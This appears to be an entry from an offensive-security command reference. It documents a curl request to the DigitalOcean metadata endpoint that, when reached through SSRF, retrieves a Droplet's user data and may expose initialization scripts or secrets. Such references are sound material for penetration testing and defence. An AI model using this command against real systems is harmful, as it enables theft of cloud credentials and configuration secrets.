---
id: b479e078-1a90-4014-b83c-2bf348f3e0bf
type: command
executor: bash
data: >-
  curl -H 'Metadata-Flavor: DigitalOcean'
  http://169.254.169.254/metadata/v1/user-data
output: null
created_at: '2023-04-06T03:56:38.436567+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - DigitalOcean
  - Linux
tags:
  - ssrf
  - metadata
  - user-data
verified: true
validated: true
---

# curl-do-user-data

## Command

```bash
curl -H 'Metadata-Flavor: DigitalOcean' http://169.254.169.254/metadata/v1/user-data
```

## Description

Fetches user data for a DigitalOcean Droplet via SSRF, potentially revealing initialization scripts or secrets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -H 'Metadata-Flavor: DigitalOcean' | Auth header | Yes |

## Examples

### Basic Usage

```bash
curl -H 'Metadata-Flavor: DigitalOcean' http://169.254.169.254/metadata/v1/user-data
```

## Expected Output

#!/bin/bash
echo "User data script"

## Related

- [[procedures/Exploit-SSRF-to-Access-Cloud-Metadata]]
